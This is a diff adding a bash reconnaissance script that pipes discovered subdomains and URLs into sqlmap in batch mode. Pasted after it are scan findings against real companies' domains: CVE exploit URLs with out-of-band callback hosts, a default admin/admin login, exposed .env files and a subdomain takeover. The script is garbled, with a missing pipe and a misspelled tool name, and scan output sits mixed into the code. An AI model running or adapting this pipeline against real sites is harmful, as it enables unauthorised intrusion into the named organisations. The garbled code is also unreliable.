@@ -1,0 +1,22 @@
+#!/bin/bash
+
+# Run subfinder with domains from domains.txt
+subfinder -dL domains.txt | dnsx | waybackurl | uro grep "?" | head -20 | httpx -silent > urls
+
+# Run sqlmap with urls from urls file
+sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+[aws-object-listing] [http] [low] https://databricks-prod-cloudfront.cloud.databricks.com [databricks-prod-cloudfront]
+[wildcard-postmessage] [http] [high] https://flickr.com
+[wildcard-postmessage] [http] [high] https://secure.tumblr.com
+[pantheon-takeover] [http] [high] https://staging.spark-summit.org
+https://www.yelp-support.com/dalfoxpathtest/a4j/g/3_3_3.Finalorg.ajax4jsf.javascript.AjaxScript?rel=1684351864000
+[wildcard-postmessage] [http] [high] https://www.tumblr.com
+[CVE-2022-0591] [http] [critical] https://alibabacloud.com/wp-admin/admin-ajax.php?URL=https://chn51il63t2m7obuij20bw3t3f7kqwath.oast.pro&action=formcraft3_get
+[CVE-2022-0591] [http] [critical] https://alibaba.com/wp-admin/admin-ajax.php?URL=https://chn51il63t2m7obuij205w5p853spkhwt.oast.pro&action=formcraft3_get
+[editor-exposure] [http] [low] https://accounts.magento.cloud/.editorconfig
+[editor-exposure] [http] [low] https://superawesome.com/.editorconfig
+[CVE-2018-1000600] [http] [high] https://alibabacloud.com/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://chn51il63t2m7obuij20o6woobntr9jdb.oast.pro
+[xui-weak-login] [http] [high] https://app.skinport.com/login [username="admin",password="admin"]
+[generic-env] [http] [high] https://hotel-deals.marriott.com/.env.example
+[laravel-env] [http] [high] https://hotel-deals.marriott.com/.env.example
+[CVE-2020-26919] [http] [critical] http://aliyun.com/login.htm
